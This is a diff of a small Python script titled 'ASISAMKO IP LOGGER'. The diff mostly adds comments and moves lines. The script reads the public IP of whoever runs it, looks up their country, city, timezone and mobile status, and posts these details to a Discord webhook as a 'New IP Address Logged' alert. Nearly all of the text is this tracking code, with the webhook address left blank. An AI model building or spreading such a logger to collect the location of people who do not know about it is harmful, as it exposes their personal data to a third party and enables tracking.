@@ -1,10 +1,9 @@
+# Import requirements
 import requests
 import public_ip as getip
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-webhook = DiscordWebhook(url="", # Enter your Discord Webhook address
-                         username="ASISAMKO IP LOGGER") # Enter Webhook name
-
+# Get IP details
 publicip = getip.get()
 params = ["ip",'query', 'status', 'country', 'countryCode', 'city', 'timezone', 'mobile']
 
@@ -16,6 +15,10 @@ city = info['city']
 countrycode = info['countryCode']
 timezone = info['timezone']
 status = info['status']
+
+# Set the webhook
+webhook = DiscordWebhook(url="", # Enter your Discord Webhook address
+                         username="ASISAMKO IP LOGGER") # Enter Webhook name
 
 embed = DiscordEmbed(title="New IP Address Logged 👁️",
                     color = "e8734d",
